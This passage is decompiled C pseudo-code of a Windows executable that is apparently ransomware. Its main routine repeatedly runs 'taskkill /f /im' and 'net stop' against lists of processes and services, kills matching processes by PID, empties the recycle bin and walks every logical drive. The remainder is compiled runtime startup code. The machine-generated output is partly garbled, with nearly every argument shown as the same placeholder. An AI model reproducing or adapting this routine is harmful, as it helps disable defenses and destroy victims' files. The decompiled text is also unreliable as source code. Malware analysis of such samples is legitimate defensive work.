        int32_t * v63 = (int32_t *)(v52 - 8); // 0x405d1d
        *v63 = (int32_t)L"/f /im %s";
        int32_t * v64 = (int32_t *)(v52 - 12); // 0x405d22
        *v64 = v62;
        wsprintfW((int16_t *)&g266, (int16_t *)&g266);
        *v61 = 1;
        *v63 = 0;
        *v64 = v62;
        *(int32_t *)(v52 - 16) = (int32_t)L"taskkill.exe";
        *(int32_t *)(v52 - 20) = (int32_t)L"open";
        v52 -= 24;
        *(int32_t *)v52 = 0;
        ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
        v53 += 4;
        int32_t v65 = 0; // 0x405d4c
        while (v53 < 80) {
            // 0x405d10
            v61 = (int32_t *)(v52 - 4);
            *v61 = *(int32_t *)(v53 + (int32_t)&g73);
            v62 = v52 + 1024;
            v63 = (int32_t *)(v52 - 8);
            *v63 = (int32_t)L"/f /im %s";
            v64 = (int32_t *)(v52 - 12);
            *v64 = v62;
            wsprintfW((int16_t *)&g266, (int16_t *)&g266);
            *v61 = 1;
            *v63 = 0;
            *v64 = v62;
            *(int32_t *)(v52 - 16) = (int32_t)L"taskkill.exe";
            *(int32_t *)(v52 - 20) = (int32_t)L"open";
            v52 -= 24;
            *(int32_t *)v52 = 0;
            ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
            v53 += 4;
            v65 = 0;
        }
        int32_t v66 = v52;
        int32_t * v67 = (int32_t *)(v66 - 4);
        *v67 = *(int32_t *)(v65 + (int32_t)&g74);
        int32_t v68 = v66 + 1024; // 0x405d56
        int32_t * v69 = (int32_t *)(v66 - 8); // 0x405d5d
        *v69 = (int32_t)L"stop %s";
        int32_t * v70 = (int32_t *)(v66 - 12); // 0x405d62
        *v70 = v68;
        wsprintfW((int16_t *)&g266, (int16_t *)&g266);
        *v67 = 1;
        *v69 = 0;
        *v70 = v68;
        *(int32_t *)(v66 - 16) = (int32_t)L"net.exe";
        *(int32_t *)(v66 - 20) = (int32_t)L"open";
        int32_t v71 = v66 - 24; // 0x405d82
        *(int32_t *)v71 = 0;
        ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
        int32_t v72 = v65 + 4; // 0x405d86
        v65 = v72;
        while (v72 < 228) {
            // 0x405d50
            v66 = v71;
            v67 = (int32_t *)(v66 - 4);
            *v67 = *(int32_t *)(v65 + (int32_t)&g74);
            v68 = v66 + 1024;
            v69 = (int32_t *)(v66 - 8);
            *v69 = (int32_t)L"stop %s";
            v70 = (int32_t *)(v66 - 12);
            *v70 = v68;
            wsprintfW((int16_t *)&g266, (int16_t *)&g266);
            *v67 = 1;
            *v69 = 0;
            *v70 = v68;
            *(int32_t *)(v66 - 16) = (int32_t)L"net.exe";
            *(int32_t *)(v66 - 20) = (int32_t)L"open";
            v71 = v66 - 24;
            *(int32_t *)v71 = 0;
            ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
            v72 = v65 + 4;
            v65 = v72;
        }
        // 0x405d91
        *(int32_t *)(v66 - 28) = 0;
        int32_t v73 = v66 - 32; // 0x405d93
        *(int32_t *)v73 = 2;
        int32_t * v74 = CreateToolhelp32Snapshot((int32_t)&g266, (int32_t)&g266); // 0x405d95
        int32_t v75 = (int32_t)v74; // 0x405d95
        *v67 = v75;
        int32_t v76 = v73; // 0x405da4
        if (v74 != (int32_t *)-1) {
            int32_t * v77 = (int32_t *)(v66 - 36); // 0x405daa
            *v77 = 556;
            int32_t v78 = v66 + 432; // 0x405daf
            int32_t v79 = v66 - 40; // 0x405db6
            int32_t * v80 = (int32_t *)v79; // 0x405db6
            *v80 = 0;
            *(int32_t *)(v66 - 44) = v78;
            function_407730((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            *(int32_t *)v78 = 556;
            *v77 = v78;
            *v80 = v75;
            bool v81 = Process32FirstW(&g266, (struct tagPROCESSENTRY32W *)&g266); // 0x405dd5
            v60 = v79;
            v59 = v79;
            v56 = v75;
            if (v81) {
                while (true) {
                  lab_0x405de3:;
                    int32_t v82 = 0;
                    int32_t v83 = v60;
                    *(int32_t *)(v83 - 4) = v83 + 500;
                    int32_t v84 = *(int32_t *)(v82 + (int32_t)&g72); // 0x405df8
                    int32_t v85 = v83 - 8; // 0x405df8
                    *(int32_t *)v85 = v84;
                    uint32_t v86; // 0x405e08
                    if (StrStrIW((int16_t *)&g266, (int16_t *)&g266) != NULL) {
                        // 0x405e08
                        v86 = *(int32_t *)(v83 + 464);
                        if (v86 >= 1001) {
                            // 0x405e23
                            *(int32_t *)(v83 - 12) = v86;
                            *(int32_t *)(v83 - 16) = (int32_t)L"/f /PID \"%d\"";
                            *(int32_t *)(v83 - 20) = v83 + 1016;
                            wsprintfW((int16_t *)&g266, (int16_t *)&g266);
                            v57 = v85;
                            v55 = 3;
                            goto lab_0x405e40;
                        }
                    }
                    int32_t v87 = v82 + 4; // 0x405e16
                    v58 = v85;
                    while (v87 < 0x1a58) {
                        // 0x405df0
                        v82 = v87;
                        v83 = v85;
                        *(int32_t *)(v83 - 4) = v83 + 500;
                        v84 = *(int32_t *)(v82 + (int32_t)&g72);
                        v85 = v83 - 8;
                        *(int32_t *)v85 = v84;
                        if (StrStrIW((int16_t *)&g266, (int16_t *)&g266) != NULL) {
                            // 0x405e08
                            v86 = *(int32_t *)(v83 + 464);
                            if (v86 >= 1001) {
                                // 0x405e23
                                *(int32_t *)(v83 - 12) = v86;
                                *(int32_t *)(v83 - 16) = (int32_t)L"/f /PID \"%d\"";
                                *(int32_t *)(v83 - 20) = v83 + 1016;
                                wsprintfW((int16_t *)&g266, (int16_t *)&g266);
                                v57 = v85;
                                v55 = 3;
                                goto lab_0x405e40;
                            }
                        }
                        // 0x405e16
                        v87 = v82 + 4;
                        v58 = v85;
                    }
                    goto lab_0x405e5f;
                }
            }
          lab_0x405e7a:
            // 0x405e7a
            v76 = v59 - 4;
            *(int32_t *)v76 = v56;
            CloseHandle(&g266);
        }
        // 0x405e81
        function_4057a0();
        *(int32_t *)(v76 - 4) = 1;
        *(int32_t *)(v76 - 8) = 0;
        *(int32_t *)(v76 - 12) = 0;
        SHEmptyRecycleBinA(&g266, (char *)&g266, (int32_t)&g266);
        *(int32_t *)(v76 - 16) = 0;
        function_404d30((int32_t)&g266);
        int32_t v88 = v76 + 2032; // 0x405e99
        *(int32_t *)(v76 - 20) = v88;
        int32_t v89 = v76 - 24; // 0x405ea3
        *(int32_t *)v89 = 0x7fff;
        int32_t v90 = GetLogicalDriveStringsW((int32_t)&g266, (int16_t *)&g266); // 0x405ea8
        v54 = v89;
        if (v90 != 0) {
            // 0x405eb2
            v54 = v89;
            if (*(int16_t *)(v76 + 2024) != 0) {
                *(int32_t *)(v89 - 4) = 0xfffe;
                *(int32_t *)(v89 - 8) = 8;
                int32_t * v91 = GetProcessHeap(); // 0x405ec7
                int32_t v92 = v89 - 12; // 0x405ecd
                *(int32_t *)v92 = (int32_t)v91;
                int32_t * v93 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x405ece
                int32_t v94 = v92; // 0x405ed8
                int32_t v95; // 0x405ece
                int32_t * v96; // 0x405edd
                int32_t * v97; // 0x405ede
                int32_t * v98; // 0x405ee3
                int32_t * v99; // 0x405ee8
                int32_t * v100; // 0x405f02
                if (v93 != NULL) {
                    // 0x405eda
                    v95 = (int32_t)v93;
                    v96 = (int32_t *)(v89 - 16);
                    *v96 = (int32_t)*(int16_t *)v88;
                    v97 = (int32_t *)(v89 - 20);
                    *v97 = (int32_t)L"\\\\?\\%c:";
                    v98 = (int32_t *)(v89 - 24);
                    *v98 = 0x7fff;
                    v99 = (int32_t *)(v89 - 28);
                    *v99 = v95;
                    wnsprintfW();
                    *v96 = v95;
                    GetDriveTypeW((int16_t *)&g266);
                    *v97 = v95;
                    function_404b60((int32_t)&g266);
                    *v98 = v95;
                    *v99 = 0;
                    v100 = GetProcessHeap();
                    v94 = v89 - 32;
                    *(int32_t *)v94 = (int32_t)v100;
                    HeapFree(&g266, (int32_t)&g266, &g266);
                }
                int32_t v101 = v94 - 4; // 0x405f0f
                *(int32_t *)v101 = v88;
                int32_t v102 = v88 + 2 + 2 * lstrlenW((int16_t *)&g266); // 0x405f19
                v54 = v101;
                while (*(int16_t *)v102 != 0) {
                    int32_t v103 = v102;
                    int32_t v104 = v101;
                    *(int32_t *)(v104 - 4) = 0xfffe;
                    *(int32_t *)(v104 - 8) = 8;
                    v91 = GetProcessHeap();
                    v92 = v104 - 12;
                    *(int32_t *)v92 = (int32_t)v91;
                    v93 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
                    v94 = v92;
                    if (v93 != NULL) {
                        // 0x405eda
                        v95 = (int32_t)v93;
                        v96 = (int32_t *)(v104 - 16);
                        *v96 = (int32_t)*(int16_t *)v103;
                        v97 = (int32_t *)(v104 - 20);
                        *v97 = (int32_t)L"\\\\?\\%c:";
                        v98 = (int32_t *)(v104 - 24);
                        *v98 = 0x7fff;
                        v99 = (int32_t *)(v104 - 28);
                        *v99 = v95;
                        wnsprintfW();
                        *v96 = v95;
                        GetDriveTypeW((int16_t *)&g266);
                        *v97 = v95;
                        function_404b60((int32_t)&g266);
                        *v98 = v95;
                        *v99 = 0;
                        v100 = GetProcessHeap();
                        v94 = v104 - 32;
                        *(int32_t *)v94 = (int32_t)v100;
                        HeapFree(&g266, (int32_t)&g266, &g266);
                    }
                    // 0x405f0f
                    v101 = v94 - 4;
                    *(int32_t *)v101 = v103;
                    v102 = v103 + 2 + 2 * lstrlenW((int16_t *)&g266);
                    v54 = v101;
                }
            }
        }
    }
    int32_t v105 = v54;
    function_401d00();
    function_404e00();
    *(int32_t *)(v105 - 4) = *(int32_t *)(v105 + 24);
    LocalFree(&g266);
    *(int32_t *)(v105 - 8) = 0;
    ExitProcess((int32_t)&g266);
    // UNREACHABLE
  lab_0x405e5f:;
    int32_t v106 = v58;
    int32_t v107 = *(int32_t *)(v106 + 28); // 0x405e5f
    *(int32_t *)(v106 - 4) = v106 + 464;
    int32_t v108 = v106 - 8; // 0x405e6b
    *(int32_t *)v108 = v107;
    bool v109 = Process32NextW(&g266, (struct tagPROCESSENTRY32W *)&g266); // 0x405e6c
    v60 = v108;
    v59 = v108;
    v56 = v107;
    if (!v109) {
        // break -> 0x405e7a
        goto lab_0x405e7a;
    }
    goto lab_0x405de3;
  lab_0x405e40:;
    int32_t v110 = v57;
    *(int32_t *)(v110 - 4) = 1;
    *(int32_t *)(v110 - 8) = 0;
    *(int32_t *)(v110 - 12) = v110 + 1024;
    *(int32_t *)(v110 - 16) = (int32_t)L"taskkill.exe";
    *(int32_t *)(v110 - 20) = (int32_t)L"open";
    int32_t v111 = v110 - 24; // 0x405e56
    *(int32_t *)v111 = 0;
    ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
    int32_t v112 = v55 - 1; // 0x405e5a
    v57 = v111;
    v55 = v112;
    v58 = v111;
    if (v112 != 0) {
        goto lab_0x405e40;
    } else {
        goto lab_0x405e5f;
    }
}

// Address range: 0x405f50 - 0x406090
int32_t function_405f50(int32_t a1, uint32_t a2) {
    // 0x405f50
    int32_t result; // 0x405f50
    int32_t * v1 = (int32_t *)(result + 20); // 0x405f5c
    uint32_t v2 = *v1; // 0x405f5c
    if (v2 >= a2) {
        int32_t v3 = v2 < 8 ? result : v2;
        int32_t v4 = 2 * a2; // 0x405f6f
        *(int32_t *)(result + 16) = a2;
        function_408e60(v3, a1, v4);
        *(int16_t *)(v3 + v4) = 0;
        return result;
    }
    int32_t v5; // 0x405f50
    int32_t v6; // 0x405f50
    int32_t v7; // 0x405f50
    int32_t v8; // 0x405f50
    int32_t v9; // 0x405f50
    if (a2 < 0x7fffffff) {
        uint32_t v10 = a2 | 7; // 0x405fa0
        v9 = 0x7ffffffe;
        if (v10 < 0x7ffffffe) {
            uint32_t v11 = v2 / 2; // 0x405fb9
            v9 = 0x7ffffffe;
            if (v2 > 0x7ffffffe - v11) {
                goto lab_0x405fea;
            } else {
                uint32_t v12 = v11 + v2; // 0x405fc8
                int32_t v13 = v10 < v12 ? v12 : v10; // 0x405fcd
                int32_t v14 = v13 + 1; // 0x405fd0
                v9 = v13;
                if (v14 > -1) {
                    uint32_t v15 = 2 * v14; // 0x405fd3
                    if (v15 < 0x1000) {
                        // 0x40600d
                        v7 = v13;
                        v6 = 0;
                        if (v15 != 0) {
                            // 0x406011
                            v7 = v13;
                            v6 = function_40609b(v15);
                        }
                        goto lab_0x406020;
                    } else {
                        // 0x405fea
                        v9 = v13;
                        v8 = v13;
                        v5 = v15 + 35;
                        if (v15 > 0xffffffdc) {
                            goto lab_0x405fea;
                        } else {
                            goto lab_dec_label_pc_unknown;
                        }
                    }
                } else {
                    goto lab_0x405fea;
                }
            }
        } else {
            goto lab_0x405fea;
        }
    } else {
        goto lab_0x406086;
    }
  lab_0x406086:
    // 0x406086
    function_406090();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
  lab_0x405fea:
    // 0x405fea
    v8 = v9;
    v5 = -1;
    goto lab_dec_label_pc_unknown;
  lab_dec_label_pc_unknown:;
    int32_t v16 = function_40609b(v5); // 0x405ff6
    if (v16 == 0) {
        // 0x406081
        function_409c03();
        goto lab_0x406086;
    } else {
        int32_t v17 = v16 + 35 & -32; // 0x406005
        *(int32_t *)(v17 - 4) = v16;
        v7 = v8;
        v6 = v17;
        goto lab_0x406020;
    }
  lab_0x406020:
    // 0x406020
    *v1 = v7;
    *(int32_t *)(result + 16) = a2;
    int32_t v18 = 2 * a2; // 0x406029
    function_4093e0(v6, a1, v18);
    *(int16_t *)(v6 + v18) = 0;
    if (v2 < 8) {
        // 0x406074
        *(int32_t *)result = v6;
        return result;
    }
    int32_t v19 = 2 * v2; // 0x406047
    int32_t v20 = v19 + 2; // 0x406047
    if (v20 < 0x1000) {
        // 0x40606a
        function_4060cb(v20);
        // 0x406074
        *(int32_t *)result = v6;
        return result;
    }
    int32_t v21 = v19 - 2;
    int32_t v22 = *(int32_t *)v21; // 0x406058
    if (v21 - v22 < 32) {
        // 0x40606a
        function_4060cb(v22);
        // 0x406074
        *(int32_t *)result = v6;
        return result;
    }
    // 0x406081
    function_409c03();
    goto lab_0x406086;
}

// Address range: 0x406090 - 0x40609b
int32_t function_406090(void) {
    // 0x406090
    function_407082("string too long");
    return __asm_int3();
}

// Address range: 0x40609b - 0x4060cb
int32_t function_40609b(int32_t a1) {
    // 0x40609b
    int32_t v1; // bp-4, 0x40609b
    int32_t * v2 = (int32_t *)((int32_t)&v1 - 4); // 0x4060ad
    *v2 = a1;
    int32_t result = function_409c53(); // 0x4060b0
    while (result == 0) {
        // 0x4060a0
        *v2 = a1;
        if (function_409c72((int32_t)&g266) == 0) {
            if (a1 != -1) {
                // 0x4060c6
                return function_4068f6();
            }
            function_406913();
            // 0x4060c6
            return function_4068f6();
        }
        *v2 = a1;
        result = function_409c53();
    }
    // 0x4060ba
    return result;
}

// Address range: 0x4060cb - 0x4060d9
int32_t function_4060cb(int32_t a1) {
    // 0x4060cb
    return function_40693d();
}

// Address range: 0x4060d9 - 0x406100
int32_t function_4060d9(void) {
    // 0x4060d9
    function_40611d();
    if ((char)function_40641a(0) == 0) {
        // 0x4060f8
        function_406942(7, (int32_t)&g266);
        return __asm_int3();
    }
    // 0x4060ea
    function_4065ce(0x40620c);
    return 0;
}

// Address range: 0x406100 - 0x40611d
int32_t function_406100(uint32_t a1) {
    uint32_t v1 = -g112 & 31; // 0x406113
    int32_t v2 = a1; // 0x406113
    if (v1 != 0) {
        v2 = a1 << 32 - v1 | a1 >> v1;
    }
    return v2 ^ g112;
}

// Address range: 0x40611d - 0x406228
int32_t function_40611d(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40612d
    __writefsdword(0, (int32_t)&v1);
    InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)&g149, 4000);
    int16_t * v2 = L"api-ms-win-core-synch-l1-2-0.dll"; // bp-44, 0x406152
    int32_t * v3 = GetModuleHandleW(L"api-ms-win-core-synch-l1-2-0.dll"); // 0x406157
    int32_t v4 = (int32_t)&v2; // 0x406161
    int32_t * v5 = v3; // 0x406161
    int32_t v6; // 0x40611d
    if (v3 != NULL) {
        goto lab_0x406178;
    } else {
        int16_t * v7 = L"kernel32.dll"; // bp-48, 0x406163
        v4 = (int32_t)&v7;
        v5 = GetModuleHandleW(L"kernel32.dll");
        v6 = v4;
        if (v5 == NULL) {
            goto lab_0x406204;
        } else {
            goto lab_0x406178;
        }
    }
  lab_0x406178:;
    int32_t v8 = (int32_t)v5;
    *(int32_t *)(v4 - 4) = (int32_t)"InitializeConditionVariable";
    *(int32_t *)(v4 - 8) = v8;
    int32_t (*func)() = GetProcAddress(&g266, (char *)&g266); // 0x40617e
    *(int32_t *)(v4 - 12) = (int32_t)"SleepConditionVariableCS";
    *(int32_t *)(v4 - 16) = v8;
    int32_t (*func2)() = GetProcAddress(&g266, (char *)&g266); // 0x40618c
    *(int32_t *)(v4 - 20) = (int32_t)"WakeAllConditionVariable";
    *(int32_t *)(v4 - 24) = v8;
    int32_t (*func3)() = GetProcAddress(&g266, (char *)&g266); // 0x40619a
    if (func != NULL && func2 != NULL && func3 != NULL) {
        // 0x4061ae
        g151 = 0;
        *(int32_t *)(v4 - 28) = (int32_t)&g150;
        function_406b3d();
        *(int32_t *)(v4 - 32) = (int32_t)func2;
        int32_t v9 = function_406100((int32_t)&g266); // 0x4061c5
        *(int32_t *)(v4 - 36) = (int32_t)func3;
        g152 = v9;
        int32_t result = function_406100((int32_t)&g266); // 0x4061d0
        g153 = result;
        // 0x4061dc
        __writefsdword(0, v1);
        return result;
    }
    // 0x4061ee
    *(int32_t *)(v4 - 28) = 0;
    *(int32_t *)(v4 - 32) = 0;
    *(int32_t *)(v4 - 36) = 1;
    int32_t v10 = v4 - 40; // 0x4061f4
    *(int32_t *)v10 = 0;
    int32_t * v11 = CreateEventW((struct _SECURITY_ATTRIBUTES *)&g266, (bool)&g266, (bool)&g266, (int16_t *)&g266); // 0x4061f5
    int32_t result2 = (int32_t)v11; // 0x4061f5
    g151 = result2;
    v6 = v10;
    if (v11 != NULL) {
        // 0x4061dc
        __writefsdword(0, v1);
        return result2;
    }
    goto lab_0x406204;
  lab_0x406204:
    // 0x406204
    *(int32_t *)(v6 - 4) = 7;
    function_406942((int32_t)&g266, (int32_t)&g266);
    __asm_int3();
    *(int32_t *)(v6 - 8) = (int32_t)&g149;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    int32_t handleClosed = 0; // 0x40621e
    if (g151 != 0) {
        // 0x406220
        *(int32_t *)(v6 - 12) = g151;
        handleClosed = CloseHandle(&g266);
    }
    // 0x406227
    return handleClosed;
}

// Address range: 0x406228 - 0x406272
int32_t function_406228(int32_t * a1) {
    // 0x406228
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
    int32_t v1 = g111 + 1; // 0x406241
    g111 = v1;
    *a1 = v1;
    int32_t v2 = *(int32_t *)(4 * g161 + __readfsdword(44)); // 0x406257
    *(int32_t *)(v2 + 4) = g111;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    return function_4062c4();
}

// Address range: 0x406272 - 0x4062c4
int32_t function_406272(int32_t * a1) {
    struct _RTL_CRITICAL_SECTION * v1 = (struct _RTL_CRITICAL_SECTION *)&g149; // bp-16, 0x40627c
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
    int32_t v2 = *a1; // 0x406286
    int32_t * v3 = (int32_t *)((int32_t)&v1 - 4);
    int32_t v4 = v2; // 0x406289
    if (v2 == 0) {
      lab_0x40628b:
        // 0x40628b
        *a1 = -1;
        // 0x4062b9
        *v3 = (int32_t)&g149;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        return &g266;
    }
    while (v4 == -1) {
        // 0x406290
        *v3 = 100;
        function_406306((int32_t)&g266);
        v4 = *a1;
        if (v4 == 0) {
            goto lab_0x40628b;
        }
    }
    int32_t v5 = *(int32_t *)(4 * g161 + __readfsdword(44)); // 0x4062ab
    *(int32_t *)(v5 + 4) = g111;
    // 0x4062b9
    *v3 = (int32_t)&g149;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    return &g266;
}

// Address range: 0x4062c4 - 0x406306
int32_t function_4062c4(void) {
    // 0x4062c4
    if (g151 == 0) {
        // 0x4062cd
        return function_406b3d();
    }
    // 0x4062f2
    SetEvent((int32_t *)g151);
    return ResetEvent((int32_t *)g151);
}

// Address range: 0x406306 - 0x406366
int32_t function_406306(int32_t dwMilliseconds) {
    // 0x406306
    int32_t result; // 0x406306
    if (g151 != 0) {
        // 0x40633f
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
        WaitForSingleObjectEx((int32_t *)g151, dwMilliseconds, false);
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g149);
        result = &g266;
    } else {
        // 0x406313
        result = function_406b3d();
    }
    // 0x406363
    return result;
}

// Address range: 0x406366 - 0x40636b
int32_t function_406366(void) {
    // 0x406366
    return function_40693d();
}

// Address range: 0x40636b - 0x4063af
int32_t function_40636b(int32_t a1, uint32_t a2) {
    int32_t v1 = *(int32_t *)(a1 + 60) + a1; // 0x406375
    int32_t v2 = v1 + 24 + (int32_t)*(int16_t *)(v1 + 20); // 0x40637e
    uint16_t v3 = *(int16_t *)(v1 + 6); // 0x406380
    if (v3 == 0) {
        // 0x4063a8
        return 0;
    }
    uint32_t v4 = *(int32_t *)(v2 + 12); // 0x406390
    if (v4 <= a2) {
        // 0x406395
        if (*(int32_t *)(v2 + 8) + v4 > a2) {
            // break -> 0x4063a8
            break;
        }
    }
    int32_t v5 = v2 + 40; // 0x40639f
    int32_t result = 0; // 0x4063a4
    while (v5 != 40 * (int32_t)v3 + v2) {
        int32_t v6 = v5;
        v4 = *(int32_t *)(v6 + 12);
        if (v4 <= a2) {
            // 0x406395
            result = v6;
            if (*(int32_t *)(v6 + 8) + v4 > a2) {
                // break -> 0x4063a8
                break;
            }
        }
        // 0x40639f
        v5 = v6 + 40;
        result = 0;
    }
    // 0x4063a8
    return result;
}

// Address range: 0x4063af - 0x4063e1
int32_t function_4063af(void) {
    // 0x4063af
    int32_t v1; // 0x4063af
    if (function_406cdb(v1) == 0) {
        // 0x4063d9
        return 0;
    }
    int32_t v2 = *(int32_t *)(__readfsdword(24) + 4); // 0x4063c4
    int32_t v3 = g158;
    while (v3 != 0) {
        if (v2 == v3) {
            // 0x4063dd
            g158 = v2;
            return v2 & -256 | 1;
        }
    }
    // 0x4063d9
    g158 = v2;
    // 0x4063d9
    return v3 & -256;
}

// Address range: 0x4063e1 - 0x40641a
int32_t function_4063e1(int32_t a1) {
    // 0x4063e1
    if (a1 == 0) {
        // 0x4063ea
        g159 = 1;
    }
    // 0x4063f1
    int32_t v1; // 0x4063e1
    function_406b3e(v1);
    int32_t v2 = function_40744d(); // 0x4063f6
    if ((char)v2 == 0) {
        // 0x4063ff
        return v2 & -256;
    }
    int32_t v3 = function_40ab22(); // 0x406403
    if ((char)v3 != 0) {
        // 0x406416
        return v3 & -256 | 1;
    }
    // 0x4063ff
    return function_407476(0) & -256;
}

// Address range: 0x40641a - 0x4064c4
int32_t function_40641a(int32_t a1) {
    // 0x40641a
    if (g156 != 0) {
        // 0x4064b8
        int32_t v1; // 0x40641a
        return v1 & -256 | 1;
    }
    int32_t v2; // 0x40641a
    if (a1 != 0 == (a1 != 1)) {
        // 0x4064bc
        function_406942(5, v2);
        return __asm_int3();
    }
    // 0x40643d
    if (a1 != 0 | function_406cdb(v2) == 0) {
        uint32_t v3 = -g112 & 31; // 0x406485
        int32_t v4 = -1; // 0x406485
        if (v3 != 0) {
            v4 = -1 << 32 - v3 | 0xffffffff >> v3;
        }
        int32_t v5 = v4 ^ g112; // 0x406487
        int32_t v6 = v5; // bp-16, 0x40648d
        g154 = v5;
        bool v7; // 0x40641a
        int32_t v8 = v7 ? -4 : 4; // 0x406496
        int32_t v9 = v8 + (int32_t)&g154; // 0x406496
        int32_t v10 = v8 + (int32_t)&v6; // 0x406496
        int32_t * v11 = (int32_t *)v10; // 0x406497
        *(int32_t *)v9 = *v11;
        int32_t * v12 = (int32_t *)(v10 + v8); // 0x406498
        *(int32_t *)(v9 + v8) = *v12;
        v6 = v5;
        g155 = v5;
        int32_t v13 = v8 + (int32_t)&g155; // 0x4064aa
        *(int32_t *)v13 = *v11;
        *(int32_t *)(v13 + v8) = *v12;
        // 0x4064ae
        g156 = 1;
        // 0x4064b8
        return v5 & -256 | 1;
    }
    int32_t v14 = function_40a9d0(&g154); // 0x40644f
    if (v14 != 0) {
        // 0x4064b8
        return v14 & -256;
    }
    int32_t v15 = function_40a9d0(&g155); // 0x40645e
    if (v15 != 0) {
        // 0x4064b8
        return v15 & -256;
    }
    // 0x4064ae
    g156 = 1;
    // 0x4064b8
    return 1;
}

// Address range: 0x4064c4 - 0x40654e
int32_t function_4064c4(void) {
    // 0x4064c4
    function_406cf0(&g76, 8, (int32_t)&g266);
    int32_t v1; // 0x4064c4
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x4064d0
    *v2 = 0;
    int32_t result; // 0x406548
    if (*(int16_t *)0x400000 != 0x5a4d) {
        // 0x406548
        *v2 = -2;
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v3 = *(int32_t *)0x40003c; // 0x4064e2
    if (*(int32_t *)(v3 + 0x400000) != 0x4550) {
        // 0x406548
        *v2 = -2;
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x4064f3
    if (*(int16_t *)(v3 + 0x400018) == 267) {
        // 0x406501
        function_40636b(0x400000, *(int32_t *)(v1 + 8) - 0x400000);
    }
    // 0x406548
    *v2 = -2;
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40654e - 0x40656b
int32_t function_40654e(int32_t a1) {
    // 0x40654e
    int32_t v1; // 0x40654e
    int32_t v2 = function_406cdb(v1); // 0x406551
    if (v2 == 0) {
        // 0x406569
        return 0;
    }
    int32_t result = v2; // 0x40655e
    if ((char)a1 == 0) {
        // 0x406560
        result = g158;
        g158 = 0;
    }
    // 0x406569
    return result;
}

// Address range: 0x40656b - 0x406593
int32_t function_40656b(int32_t a1, int32_t a2) {
    // 0x40656b
    if (g159 != 0) {
        if ((char)a2 != 0) {
            // 0x40658f
            int32_t v1; // 0x40656b
            return v1 & -256 | 1;
        }
    }
    // 0x40657d
    int32_t v2; // 0x40656b
    function_40ab34(a1, v2);
    // 0x40658f
    return function_407476(a1) & -256 | 1;
}

// Address range: 0x406593 - 0x4065ce
int32_t function_406593(int32_t a1, int32_t a2) {
    int32_t v1 = g154 ^ g112; // 0x40659d
    uint32_t v2 = g112 & 31; // 0x4065a3
    int32_t v3 = v1; // 0x4065a9
    if (v2 != 0) {
        v3 = v1 >> v2 | v1 << 32 - v2;
    }
    int32_t v4; // 0x406593
    int32_t v5; // 0x406593
    if (v3 != -1) {
        // 0x4065b7
        v4 = function_40aa0d(&g154, a1, v5);
    } else {
        // 0x4065b0
        v4 = function_40a99d(a1, v5);
    }
    // 0x4065c2
    return v4 == 0 ? a1 : 0;
}

// Address range: 0x4065ce - 0x4065e3
int32_t function_4065ce(int32_t a1) {
    // 0x4065ce
    int32_t v1; // 0x4065ce
    return function_406593(a1, v1) == 0;
}

// Address range: 0x4065e3 - 0x4065ec
int32_t function_4065e3(void) {
    // 0x4065e3
    return function_40609b((int32_t)&g266);
}

// Address range: 0x4065ec - 0x406698
int32_t function_4065ec(void) {
    // 0x4065ec
    int32_t v1; // 0x4065ec
    function_40ab4c(2, v1);
    function_40acda(function_406de5());
    int32_t v2 = function_40ae0b(); // 0x4065ff
    *(int32_t *)v2 = function_406a91();
    if ((char)function_40641a(1) == 0) {
        // 0x406688
        function_406942(7, (int32_t)&g266);
        __asm_int3();
        function_406e21();
        return 0;
    }
    // 0x40661c
    __asm_fnclex();
    function_406e56();
    function_4065ce(0x406e82);
    int32_t v3 = function_406cd7(); // 0x40662d
    if (function_40a434(v3) != 0) {
        // 0x406688
        function_406942(7, (int32_t)&g266);
        __asm_int3();
        function_406e21();
        return 0;
    }
    // 0x40663e
    InitializeSListHead(&g266);
    if (function_406e3e() != 0) {
        // 0x40664c
        function_40abd1(0x406a91);
    }
    // 0x406657
    function_406b3d();
    function_406b3d();
    function_406dfa();
    function_40ad74(function_406a91());
    if ((char)function_406df7() != 0) {
        // 0x40667b
        function_40a645();
    }
    // 0x406680
    function_406a91();
    return 0;
}

// Address range: 0x406698 - 0x4066aa
int32_t function_406698(void) {
    // 0x406698
    SetUnhandledExceptionFilter((int32_t (*)(struct _EXCEPTION_POINTERS *))&g266);
    return function_40addc(function_406a91());
}

// Address range: 0x4066aa - 0x40681b
int32_t function_4066aa(void) {
    int32_t v1 = &g77; // bp-8, 0x4066ac
    function_406cf0(&g77, 20, (int32_t)&g266);
    int32_t v2 = 1; // bp-12, 0x4066b6
    int32_t v3; // 0x4066aa
    if ((char)function_4063e1(1) != 0) {
        // 0x4066c6
